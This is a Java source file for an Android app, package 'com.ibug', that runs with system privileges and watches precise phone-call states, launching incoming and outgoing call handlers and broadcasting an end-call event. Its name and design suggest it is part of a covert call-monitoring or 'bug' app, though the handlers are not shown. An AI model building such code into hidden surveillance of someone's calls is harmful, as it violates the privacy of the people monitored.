package com.ibug.call;

import android.content.BroadcastReceiver;
import com.ibug.IAnnotations.*;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.ibug.R;

import static com.ibug.misc.Utils.Tag;

@SystemRoot
public class PreciseCallStatus extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(Tag,"PreciseCallState <Running As System App>");
        int state = intent.getIntExtra("foreground_state",-2);
        context = context.getApplicationContext();
        switch (state) {
            case PRECISE_CALL_STATE_ALERTING:
                PREVIOUS_CALL_STATE = PRECISE_CALL_STATE_ALERTING;
                break;
            case PRECISE_CALL_STATE_ACTIVE:
                switch (PREVIOUS_CALL_STATE) {
                    case PRECISE_CALL_STATE_ALERTING:
                        new OutgoingCall(context);
                        break;
                    case PRECISE_CALL_STATE_IDLE:
                        new IncomingCall(context);
                        break;
                }
                PREVIOUS_CALL_STATE = PRECISE_CALL_STATE_ACTIVE;
                break;

            case PRECISE_CALL_STATE_DISCONNECTING: ;
            case PRECISE_CALL_STATE_DISCONNECTED: ;
            case PRECISE_CALL_STATE_IDLE:
                if (PREVIOUS_CALL_STATE == PRECISE_CALL_STATE_ACTIVE) {
                    String action = context.getString(R.string.end_call);
                    Intent _intent = new Intent(action);
                    context.sendBroadcast(_intent);
                };
                PREVIOUS_CALL_STATE = PRECISE_CALL_STATE_IDLE;
                break;
        }

    }

    /** Call state is not valid (Not received a call state). */
    public static final int PRECISE_CALL_STATE_NOT_VALID =      -1;
    /** Call state: No activity. */
    public static final int PRECISE_CALL_STATE_IDLE =           0;
    /** Call state: Active. */
    public static final int PRECISE_CALL_STATE_ACTIVE =         1;
    /** Call state: On hold. */
    public static final int PRECISE_CALL_STATE_HOLDING =        2;
    /** Call state: Dialing. */
    public static final int PRECISE_CALL_STATE_DIALING =        3;
    /** Call state: Alerting. */
    public static final int PRECISE_CALL_STATE_ALERTING =       4;
    /** Call state: Incoming. */
    public static final int PRECISE_CALL_STATE_INCOMING =       5;
    /** Call state: Waiting. */
    public static final int PRECISE_CALL_STATE_WAITING =        6;
    /** Call state: Disconnected. */
    public static final int PRECISE_CALL_STATE_DISCONNECTED =   7;
    /** Call state: Disconnecting. */
    public static final int PRECISE_CALL_STATE_DISCONNECTING =  8;
    /** Call state: Previous call state. */
    public static int PREVIOUS_CALL_STATE =  PRECISE_CALL_STATE_IDLE;

}
